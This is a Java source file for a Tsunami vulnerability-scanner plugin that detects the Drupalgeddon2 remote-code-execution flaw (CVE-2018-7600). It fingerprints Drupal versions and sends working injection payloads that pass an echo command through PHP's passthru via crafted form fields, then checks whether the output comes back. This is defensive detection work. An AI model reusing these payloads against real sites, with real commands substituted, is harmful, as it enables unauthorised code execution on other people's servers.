package com.google.tsunami.plugins.detectors.rce.drupalgeddon2;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Drupal RCE named Drupalgeddon2. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Drupalgeddon2RceDetector",
    version = "0.1",
    description = "This detector checks Drupal RCE named Drupalgeddon2 (CVE-2018-7600).",
    author = "yuradoc (yuradoc.commercial@gmail.com)",
    bootstrapModule = Drupalgeddon2RceDetectorBootstrapModule.class)
public final class Drupalgeddon2RceDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String[] DRUPAL_VER_CHECK_PATHS = {
    "CHANGELOG.txt",
    "core/CHANGELOG.txt",
    "includes/bootstrap.inc",
    "core/includes/bootstrap.inc",
    "includes/database.inc",
    "",
  };

  private static final String VULN_FORM_PATH_V7 = "user/password";
  private static final String VULN_FORM_PATH_V8 = "user/register";

  private static final String PHP_FUNC = "passthru";

  private static final String[] VULN_FORM_ELEMENTS_V8 = {
    "mail", "timezone",
  };

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  Drupalgeddon2RceDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Drupalgeddon2RceDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  /** Check if the web service is vulnerable. */
  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String drupalVersion = detectDrupalVersion(networkService);
    if (drupalVersion.isEmpty()
        || !(drupalVersion.startsWith("7") || drupalVersion.startsWith("8"))) return false;

    String attackFormPath = drupalVersion.startsWith("8") ? VULN_FORM_PATH_V8 : VULN_FORM_PATH_V7;
    HttpResponse resp = requestDrupalPath(networkService, attackFormPath, false);
    String body = resp.bodyString().get();
    if (resp.status().code() != HttpStatus.OK.code() || body.isEmpty()) return false;

    resp = requestDrupalPath(networkService, attackFormPath);
    body = resp.bodyString().get();
    Boolean cleanUrlEnabled = drupalVersion.startsWith("8");
    if (!(resp.status().code() == HttpStatus.OK.code() && !body.isEmpty())) {
      if (drupalVersion.startsWith("8")) return false;
      cleanUrlEnabled = false;
    }

    HttpHeaders headers =
        HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded").build();

    String payloadCmd = "echo";
    if (drupalVersion.startsWith("8"))
      for (var formElement : VULN_FORM_ELEMENTS_V8) {
        String random = randomString();
        Optional<String[]> payloadOpts = buildPayloadV8(payloadCmd + " " + random, formElement);
        if (!payloadOpts.isPresent()) continue;
        String uriSuffix = payloadOpts.get()[0];
        String payload = payloadOpts.get()[1];

        try {
          resp =
              httpClient.send(
                  post(targetUri + (cleanUrlEnabled ? "" : "?q=") + attackFormPath + uriSuffix)
                      .setHeaders(headers)
                      .setRequestBody(ByteString.copyFromUtf8(payload))
                      .build(),
                  networkService);
        } catch (IOException e) {
          logger.atWarning().withCause(e).log("Unable to POST '%s' payload.", targetUri);
          return false;
        }

        body = resp.bodyString().get();
        if (resp.status().code() != HttpStatus.OK.code() || body.isEmpty()) continue;

        if (body.indexOf(random) != -1) return true;
      }
    else {
      String random = randomString();
      String uriSuffix =
          "&name[%23post_render][]="
              + PHP_FUNC
              + "&name[%23type]=markup&name[%23markup]="
              + payloadCmd
              + " "
              + random;
      String payload = "form_id=user_pass&_triggering_element_name=name";

      try {
        resp =
            httpClient.send(
                post(targetUri + (cleanUrlEnabled ? "" : "?q=") + attackFormPath + uriSuffix)
                    .setHeaders(headers)
                    .setRequestBody(ByteString.copyFromUtf8(payload))
                    .build(),
                networkService);
      } catch (IOException e) {
        logger.atWarning().withCause(e).log("Unable to POST '%s' payload.", targetUri);
        return false;
      }

      body = resp.bodyString().get();
      String formElementName = "form_build_id";
      Optional<String> formElementVal =
          extractValueOccurrence(
              "input type=\"hidden\" name=\"" + formElementName + "\".* value=\"(.*)\"", body);
      if (!formElementVal.isPresent()) return false;

      uriSuffix = "file/ajax/name/%23value/" + formElementVal.get();
      payload = formElementName + "=" + formElementVal.get();

      try {
        resp =
            httpClient.send(
                post(targetUri + (cleanUrlEnabled ? "" : "?q=") + uriSuffix)
                    .setHeaders(headers)
                    .setRequestBody(ByteString.copyFromUtf8(payload))
                    .build(),
                networkService);
      } catch (IOException e) {
        logger.atWarning().withCause(e).log("Unable to POST '%s' payload.", targetUri);
        return false;
      }

      body = resp.bodyString().get();
      if (resp.status().code() != HttpStatus.OK.code() || body.isEmpty()) return false;

      if (body.indexOf(random) != -1) return true;
    }
    return false;
  }

  private String detectDrupalVersion(NetworkService networkService) {
    String url = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String drupalVersion = "";
    HttpResponse resp;
    for (var path : DRUPAL_VER_CHECK_PATHS) {
      try {
        resp = httpClient.send(get(url + path).withEmptyHeaders().build(), networkService);
        if (drupalVersion.isEmpty() && resp.headers().get("X-Generator").isPresent())
          drupalVersion =
              extractDrupalVersion(
                      "Drupal (.*) \\(https?:\\/\\/(www.)?drupal.org\\)",
                      resp.headers().get("X-Generator").get())
                  .orElse("");

        if (resp.status().code() == HttpStatus.OK.code()) {
          String body = resp.bodyString().get();

          if (!body.isEmpty()) {
            if (path.indexOf("CHANGELOG.txt") != -1) {
              Optional<String> _drupalVersion = extractDrupalVersion("Drupal (.*),", body, true);
              if (_drupalVersion.isPresent()) drupalVersion = _drupalVersion.get();
            } else
              drupalVersion =
                  extractDrupalVersion(
                          "<meta name=\"Generator\" content=\"Drupal (.*) \\(http", body)
                      .orElse("");
          }
          if (!drupalVersion.isEmpty() && !drupalVersion.endsWith("x")) break;
        } else if (drupalVersion.isEmpty() && resp.status().code() == HttpStatus.FORBIDDEN.code()) {
          if (path.equals("includes/database.inc")) {
            drupalVersion = "7.x"; // or 6.x
          } else if (path.indexOf("core/") == 0) {
            drupalVersion = "8.x";
          }
        }
      } catch (Exception e) {
        logger.atFine().log("Failed to send request.");
      }
    }
    return drupalVersion;
  }

  private Optional<String> extractValueOccurrence(String regexp, String input) {
    String val = null;

    try {
      Matcher m = Pattern.compile(regexp).matcher(input);
      if (m.find() && m.groupCount() > 0) val = m.group(1);
    } catch (Exception ignore) {
    }

    return Optional.ofNullable(val);
  }

  private Optional<String> extractDrupalVersion(String regexp, String input, Boolean knownMinor) {
    Optional<String> drupalVersion = extractValueOccurrence(regexp, input);
    if (drupalVersion.isPresent() && !knownMinor)
      drupalVersion = Optional.of(drupalVersion.get() + ".x");
    return drupalVersion;
  }

  private Optional<String> extractDrupalVersion(String regexp, String input) {
    return extractDrupalVersion(regexp, input, false);
  }

  private HttpResponse requestDrupalPath(
      NetworkService networkService, String path, Boolean cleanUrl) {
    String url = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String queryPart = cleanUrl ? "" : "?q=";

    HttpResponse resp = null;
    try {
      resp =
          httpClient.send(get(url + queryPart + path).withEmptyHeaders().build(), networkService);
    } catch (Exception e) {
      logger.atFine().log("Failed to send request.");
    }
    return resp;
  }

  private HttpResponse requestDrupalPath(NetworkService networkService, String path) {
    return requestDrupalPath(networkService, path, true);
  }

  private Optional<String[]> buildPayloadV8(String payloadCmd, String formElement) {
    String uriSuffix = null, payload = null;
    if (formElement.equals("mail")) {
      uriSuffix = "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
      payload =
          "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]="
              + PHP_FUNC
              + "&mail[a][#type]=markup&mail[a][#markup]="
              + payloadCmd;
    } else if (formElement.equals("timezone")) {
      uriSuffix =
          "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
      payload =
          "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]="
              + PHP_FUNC
              + "&timezone[a][#lazy_builder][][]="
              + payloadCmd;
    }
    return uriSuffix == null ? Optional.empty() : Optional.of(new String[] {uriSuffix, payload});
  }

  private String randomString() {
    return Long.toHexString(Double.doubleToLongBits(Math.random()));
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("yuradoc").setValue("CVE-2018-7600"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Drupal RCE named Drupalgeddon2 (CVE-2018-7600) (SA-CORE-2018-002)")
                .setDescription(
                    "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, "
                        + "and 8.5.x before 8.5.1 allows remote attackers to"
                        + " execute arbitrary code because of an issue affecting"
                        + " multiple subsystems with default or common module configurations."))
        .build();
  }
}
